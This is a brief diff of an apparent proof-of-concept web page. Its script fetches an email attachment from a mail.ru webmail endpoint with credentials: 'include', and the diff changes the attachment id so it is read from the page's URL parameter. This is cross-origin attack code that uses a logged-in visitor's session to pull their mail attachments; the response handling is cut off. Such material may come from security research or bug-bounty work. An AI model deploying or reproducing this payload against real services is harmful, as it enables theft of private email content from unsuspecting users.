@@ -7,7 +7,8 @@
 </head>
 <body>
     <script>
-        fetch("https://af12.mail.ru/cgi-bin/getattachment?id=17393175040858538672&partids=0;1_0;2&mode=attachment&fname=test", {
+        const params = new URLSearchParams(window.location.search);
+        fetch("https://af12.mail.ru/cgi-bin/getattachment?&partids=0;1_0;2&mode=attachment&fname=test&id=" + params.get("id"), {
             credentials: "include"
         })
         .then(response => {
